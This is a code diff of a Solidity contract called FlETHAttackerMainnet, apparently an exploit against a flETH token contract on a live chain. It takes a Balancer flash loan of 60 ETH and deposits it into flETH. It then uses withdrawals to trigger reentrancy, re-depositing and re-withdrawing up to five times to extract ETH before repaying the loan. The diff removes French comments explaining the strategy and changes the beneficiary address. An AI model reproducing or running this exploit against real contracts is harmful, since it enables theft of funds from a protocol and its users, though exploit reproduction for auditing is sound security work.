@@ -34,12 +34,9 @@ contract FlETHAttackerMainnet {
     IFLETH public constant flETH = IFLETH(0x000000000D564D5be76f7f0d28fE52605afC7Cf8);
     IBalancerVault public constant balancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     IWETH public constant WETH = IWETH(0x4200000000000000000000000000000000000006);
-
-    address public constant BENEFICIARY = 0x161B2CA2f65a4b8bfd4317569b2Fc386CFB2A1A0;
-
+    address public constant BENEFICIARY = 0x2707;
     uint256 public constant FLASHLOAN_AMOUNT = 60 ether;
     uint256 public constant MAX_REENTRANCY_DEPTH = 5;
-
     address public immutable deployer;
     bool public attackExecuted;
     bool private attacking;
@@ -68,13 +65,10 @@ contract FlETHAttackerMainnet {
     function executeAttack() external onlyDeployer notExecuted {
         attackExecuted = true;
         emit AttackStarted(FLASHLOAN_AMOUNT, BENEFICIARY);
-
         address[] memory tokens = new address[](1);
         tokens[0] = address(WETH);
-
         uint256[] memory amounts = new uint256[](1);
         amounts[0] = FLASHLOAN_AMOUNT;
-
         balancerVault.flashLoan(
             address(this),
             tokens,
@@ -95,27 +89,17 @@ contract FlETHAttackerMainnet {
 
         uint256 flashAmount = amounts[0];
 
-        // Unwrap WETH -> ETH
         WETH.withdraw(flashAmount);
-
-        // Reset counters
         reentrancyCount = 0;
         totalExtracted = 0;
-
-        // FLOW DE LA TRACE:
-        // 1. Deposit ~90.75% du flashloan
-        //    Cela force le transfert vers Strategy
         uint256 depositAmount = (flashAmount * 9075) / 10000; // 90.75%
 
         flETH.deposit{value: depositAmount}(0);
         uint256 flETHBalance = flETH.balanceOf(address(this));
 
-        // 2. Withdraw tout pour déclencher réentrance
         attacking = true;
         flETH.withdraw(flETHBalance);
         attacking = false;
-
-        // 3. Calculer résultats
         uint256 finalBalance = address(this).balance;
 
         if (finalBalance >= flashAmount) {
@@ -125,8 +109,6 @@ contract FlETHAttackerMainnet {
         }
 
         emit AttackCompleted(totalExtracted, netProfit);
-
-        // 4. Rembourser flashloan
         WETH.deposit{value: flashAmount}();
         require(WETH.transfer(address(balancerVault), flashAmount), "WETH transfer failed");
     }
@@ -140,28 +122,14 @@ contract FlETHAttackerMainnet {
         totalExtracted += msg.value;
 
         emit ReentrancyCycle(reentrancyCount, msg.value, totalExtracted);
-
-        // STRATÉGIE DE RÉENTRANCE DE LA TRACE:
-        // - Cycle 1: Reçoit 54.45 ETH (le deposit initial)
-        // - Cycle 2-5: Divise par 2 à chaque fois (50% re-deposit)
-        //
-        // À chaque cycle:
-        // 1. Re-deposit 50% du reçu
-        // 2. Withdraw immédiatement tout flETH
-        // 3. Cela force flETH <-> Strategy à échanger des ETH
-
         if (reentrancyCount >= MAX_REENTRANCY_DEPTH) {
-            return; // Arrêter la réentrance
+            return;
         }
 
-        // Re-déposer 50% du montant reçu
         uint256 reDepositAmount = msg.value / 2;
-
         if (reDepositAmount > 0) {
             flETH.deposit{value: reDepositAmount}(0);
             uint256 flETHMinted = flETH.balanceOf(address(this));
-
-            // Re-withdraw immédiatement
             if (flETHMinted > 0) {
                 flETH.withdraw(flETHMinted);
             }
@@ -169,7 +137,6 @@ contract FlETHAttackerMainnet {
     }
 
     fallback() external payable {
-        // Recevoir ETH
     }
 
     function checkSystemState() external view returns (
